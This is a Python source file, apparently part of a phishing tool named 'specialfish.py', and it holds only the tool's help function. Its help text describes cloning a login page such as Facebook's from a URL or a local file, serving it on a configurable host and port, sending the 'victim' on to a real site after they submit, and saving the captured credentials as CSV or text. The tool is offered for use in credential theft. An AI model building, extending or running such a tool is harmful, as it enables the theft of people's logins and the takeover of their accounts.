
def help(command):
    if command == "--import-template": 
        description = "import a login template using a url for example: --import-template=https://facebook.com/login"
        print(description)
    if command == "--local-template":
        description = "use a local template that you might have downloaded to an index.html, example: --local-template=./mytemplate/index.html"
        print(description)

    if command == "--redirect": 
        description = "configure where the victim will be directed to post the phishing, example: --redirect=https://google.com"
        print(description)

    if command == "--webserver-port":
        description = "configure a port for the server the default is 8080, example: --webserver-port=8082"
        print(description)

    if command == "--webserver-host": 
        description = "configure a host, the default is: 127.0.0 1, example: --webserver-host=0.0.0.0"
        print(description)
    
    if command == "--output": 
        description = "edit the phishing output, if you want in csv use: --output=csv or you want text: --output=text"
        print(description)

    if command == "":
        print("Use: [tool] [argv]")
        print("\tFor Help: [tool][-h/--help][command]")
        print("\tFor list Commands: [tool][-h/--help][--list-commands]")

    if command == "--list-commands":
        print("Commands:")
        print("\t--import-template")
        print("\t--local-template")
        print("\t--webserver-port")
        print("\t--webserver-host")
        print("\t--redirect")
        print("\t--output")

        print("Example:")
        print("\t./specialfish.py --import-template=https://facebook.com/login --redirect=https://facebook.com --output=csv")